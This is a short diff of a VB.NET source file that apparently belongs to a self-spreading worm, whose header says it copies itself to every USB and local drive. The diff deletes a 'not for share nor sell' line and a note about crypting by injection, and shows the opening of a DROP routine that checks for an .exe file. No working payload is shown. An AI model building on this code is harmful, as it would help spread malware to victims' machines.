@@ -34,7 +34,6 @@ Imports System.Management
 '## also will copy itself to every USB and local driver ..       ##
 '##                                                              ##
 '## for educational purposes only ..                             ##
-'## it's not for share nor sell ..                               ##
 '##                                                              ##
 '##                                                              ##
 '##################################################################
@@ -118,9 +117,6 @@ Public Module Core
 
     Public Sub DROP()
 
-        '##############################################
-        '## For crypting please select inject itself ## 
-        '##############################################
 
         ' let's check our file
         If Not IO.Path.GetExtension(LEXE) = ".exe" Then
